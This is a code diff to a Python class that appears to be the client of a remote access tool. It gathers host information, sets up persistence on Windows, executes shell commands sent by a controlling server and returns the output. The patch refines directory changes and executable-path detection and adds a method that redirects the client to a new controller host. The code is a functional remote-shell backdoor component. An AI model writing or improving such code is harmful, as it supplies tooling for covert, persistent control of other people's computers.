@@ -68,7 +68,13 @@ class Control(metaclass=abc.ABCMeta):
         info = {"hostname": _hostname, "platform": _platform,
                 "architecture": platform.architecture(), "machine": platform.machine(),
                 "processor": platform.processor(),
-                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
+                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8}
+        exec_path = os.path.realpath(sys.argv[0])
+
+        if not exec_path.endswith(".py"):
+            exec_path = os.path.realpath(sys.executable)
+
+        info = {**info, "exec_path": exec_path}
 
         if platforms.OS == platforms.WINDOWS:
             p = Persistence()
@@ -306,22 +312,16 @@ class Control(metaclass=abc.ABCMeta):
                     command_request = command_request.replace("chdir", "cd", 1)
 
                 if command_request[:3].lower() == "cd ":
-                    cwd = ' '.join(command_request.split(" ")[1:])
+                    new_dir = os.path.expandvars(' '.join(command_request.split(" ")[1:]))
 
-                    try:
-                        command = subprocess.Popen('cd' if platforms.OS == platforms.WINDOWS else 'pwd', cwd=cwd,
-                                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                                   stdin=subprocess.PIPE, shell=True)
-                    except FileNotFoundError as e:
-                        self.es.sendall_json(SERVER_COMMAND_RSP, str(e))
-                    else:
-                        if command.stderr.read().decode() == "":  # if there is no error
-                            output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
-                            os.chdir(output)  # change directory
-
+                    if os.path.isdir(new_dir):
+                        try:
+                            os.chdir(new_dir)
                             self.es.send_json(SERVER_SHELL_DIR, os.getcwd())
-                        else:
-                            self.es.send_json(SERVER_COMMAND_RSP, helper.decode(command.stderr.read()))
+                        except Exception as e:
+                            self.es.sendall_json(SERVER_COMMAND_RSP, f"Could not enter directory: {e}")
+                    else:
+                        self.es.sendall_json(SERVER_COMMAND_RSP, f"Directory name is invalid")
                 else:
                     command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE,
@@ -442,3 +442,7 @@ class Control(metaclass=abc.ABCMeta):
                                          helper.decode(redirected_output.getvalue().encode()))
             elif command["key"] == SERVER_PYTHON_INTERPRETER_LEAVE:
                 break
+
+    def change_host(self, host):
+        self.es.socket.close()
+        raise errors.ClientSocket.ChangeConnectionDetails(f"{host['host']}:{host['port']}")
